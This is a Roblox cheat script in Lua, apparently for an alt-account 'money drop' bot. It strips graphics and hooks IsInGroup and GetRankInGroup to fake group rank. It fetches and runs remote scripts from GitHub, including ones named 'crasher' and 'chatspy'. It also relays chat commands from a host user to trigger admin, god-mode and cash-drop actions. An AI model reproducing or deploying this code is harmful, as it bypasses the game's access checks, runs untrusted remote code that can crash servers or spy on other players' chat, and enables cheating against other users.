local decalsyeeted = true
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end

hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/crasher.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/chatspy.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()


local plr = game.Players.LocalPlayer
local Mouse = plr:GetMouse()
        
Mouse.KeyDown:Connect(function(a)
    if a == "l" then
        if game.CoreGui:FindFirstChild("Redware") then
            game.CoreGui.Redware:Destroy()
        end
        Holder = Instance.new("ScreenGui")
        Frame = Instance.new("Frame")

        Holder.Name = "Redware"
        Holder.Parent = game.CoreGui
        Holder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        Holder.IgnoreGuiInset = true
        
        Frame.Parent = Holder
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
        Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
        Frame.Size = UDim2.new(1, 0, 1, 0)
        setfpscap(3)
    elseif a == "k" then
        setfpscap(60)
        if game.CoreGui:FindFirstChild("Redware") then
            game.CoreGui.Redware:Destroy()
        end
    end
end)

function saymsg(msg)
    game:service"ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
end

local Players = game:GetService("Players")

function CMD(Str)
    local Cmd = (Str:lower():split(" "))
    if Cmd[1] == ((getgenv().Settings.prefix).."start") then
        wait(3)
        saymsg((getgenv().Settings.prefix).."delcash on")
        if Cmd[2] == nil then
            wait(3)
            saymsg((getgenv().Settings.prefix).."setup admin")
            wait(3)
            saymsg((getgenv().Settings.prefix).."god")
            wait(3)
            saymsg((getgenv().Settings.prefix).."drop")
        elseif Cmd[2] and not Cmd[3] then
            wait(3)
            saymsg((getgenv().Settings.prefix).."setup admin")
            wait(3)
            saymsg((getgenv().Settings.prefix).."god")
            wait(3)
            saymsg((getgenv().Settings.prefix).."cdrop "..Cmd[2])
        elseif Cmd[3] and not Cmd[4] then
            wait(3)
            saymsg((getgenv().Settings.prefix).."setup "..Cmd[3])
            wait(3)
            saymsg((getgenv().Settings.prefix).."god")
            wait(3)
            saymsg((getgenv().Settings.prefix).."cdrop "..Cmd[2])
        end
    elseif Cmd[1] == ((getgenv().Settings.prefix).."stop") then
        wait(3)
        saymsg("/unlock")
    elseif Cmd[1] == ((getgenv().Settings.prefix).."dp") then
        wait(3)
        saymsg((getgenv().Settings.prefix).."host around")
        wait(3)
        saymsg((getgenv().Settings.prefix).."drop")
    end
end

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data) 
    if Players[Data.FromSpeaker].UserId == tonumber(getgenv().Settings.host) then
        CMD(Data.Message)
    end
end)
